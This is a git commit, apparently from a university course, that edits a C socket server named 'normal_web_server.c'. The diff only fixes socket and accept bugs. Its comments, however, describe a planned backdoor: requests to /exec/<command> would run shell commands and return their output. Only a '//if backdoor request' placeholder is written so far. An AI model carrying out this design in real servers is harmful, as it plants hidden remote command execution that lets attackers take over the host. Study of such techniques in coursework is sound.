acd6be012fb7b67ad2f60cca874091d8e76b046d
Austen Mack <austen.mack@asu.edu>
2021-01-18 13:03:13 -0700

    connection established, 404 header visible using telnet but not curl or browser

--- normal_web_server.c
+++ normal_web_server.c
@@ -4,6 +4,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <unistd.h>
+#include <string.h>
 
 int main(int argc, char *argv[]) {
 
@@ -11,7 +12,7 @@ int main(int argc, char *argv[]) {
 
     //Create socket, define address, bind to address, listen to port
     int mah_socket;
-    mah_socket = socket(AF_INET, SOCK_STREAM, 0);
+    mah_socket = socket(PF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_address;
     server_address.sin_family = AF_INET;
@@ -20,21 +21,24 @@ int main(int argc, char *argv[]) {
 
     bind(mah_socket, (struct sockaddr *) &server_address, sizeof(server_address));
 
-    listen(mah_socket, 3);    
+    listen(mah_socket, 1);    
     
     //GET requests of valid URL format get 404
     //GET requests with URL of form /exec/<command> execute it using libc function
     //HTTP response is stdout of executed command, status code 200
     //No limit on characters, be able to handle anything
 
-    char normal_response_header[1024] =
+    char *normal_response_header =
         "HTTP/1.1 404 Not Found\r\n"
         "Content-Type: text/html\r\n";
 
     int client_socket;
     while(1) {
-        client_socket = accept(client_socket, NULL, NULL);
-        send(client_socket, normal_response_header, sizeof(normal_response_header), 0);
+        client_socket = accept(mah_socket, NULL, NULL);
+        //if backdoor request
+        
+        //else
+        send(client_socket, normal_response_header, strlen(normal_response_header), 0);
         close(client_socket);
     }
 
